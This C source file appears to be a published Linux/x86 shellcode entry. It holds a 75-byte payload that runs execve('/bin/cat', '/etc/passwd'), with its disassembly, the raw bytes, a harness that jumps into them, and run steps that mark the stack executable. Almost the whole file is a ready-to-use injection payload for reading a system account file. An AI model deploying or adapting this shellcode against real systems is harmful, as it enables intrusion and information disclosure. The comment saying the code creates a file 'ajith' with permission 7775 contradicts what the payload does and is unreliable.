/*
---------------------------------------------------------------------------------------------------

# Linux/x86 - execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL) - 75 bytes
# Tested in Zorin OS 10 x86
# Author: Ajith Kp

Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

08048060 <.text>:
 8048060:	eb 1f                	jmp    0x8048081
 8048062:	5b                   	pop    %ebx
 8048063:	31 c0                	xor    %eax,%eax
 8048065:	88 43 0b             	mov    %al,0xb(%ebx)
 8048068:	88 43 18             	mov    %al,0x18(%ebx)
 804806b:	89 5b 19             	mov    %ebx,0x19(%ebx)
 804806e:	8d 4b 0c             	lea    0xc(%ebx),%ecx
 8048071:	89 4b 1d             	mov    %ecx,0x1d(%ebx)
 8048074:	89 43 21             	mov    %eax,0x21(%ebx)
 8048077:	b0 0b                	mov    $0xb,%al
 8048079:	8d 4b 19             	lea    0x19(%ebx),%ecx
 804807c:	8d 53 21             	lea    0x21(%ebx),%edx
 804807f:	cd 80                	int    $0x80
 8048081:	e8 dc ff ff ff       	call   0x8048062
 8048086:	2f                   	das
 8048087:	2f                   	das
 8048088:	2f                   	das
 8048089:	2f                   	das
 804808a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
 804808d:	2f                   	das
 804808e:	63 61 74             	arpl   %sp,0x74(%ecx)
 8048091:	23 2f                	and    (%edi),%ebp
 8048093:	2f                   	das
 8048094:	65 74 63             	gs je  0x80480fa
 8048097:	2f                   	das
 8048098:	70 61                	jo     0x80480fb
 804809a:	73 73                	jae    0x804810f
 804809c:	77 64                	ja     0x8048102
 804809e:	23 41 4a             	and    0x4a(%ecx),%eax
 80480a1:	49                   	dec    %ecx
 80480a2:	54                   	push   %esp
 80480a3:	48                   	dec    %eax
 80480a4:	41                   	inc    %ecx
 80480a5:	4a                   	dec    %edx
 80480a6:	49                   	dec    %ecx
 80480a7:	54                   	push   %esp
 80480a8:	48                   	dec    %eax
 80480a9:	4b                   	dec    %ebx
 80480aa:	50                   	push   %eax
---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o cat_etc_passwd cat_etc_passwd.c
$ execstack -s cat_etc_passwd
$ ./cat_etc_passwd

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\xeb\x1f\x5b\x31\xc0\x88\x43\x0b\x88\x43\x18\x89\x5b\x19\x8d\x4b\x0c\x89\x4b\x1d\x89\x43\x21\xb0\x0b\x8d\x4b\x19\x8d\x53\x21\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x63\x61\x74\x23\x2f\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x41\x4a\x49\x54\x48\x41\x4a\x49\x54\x48\x4b\x50";
// It will create file named 'ajith' with permission 7775
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}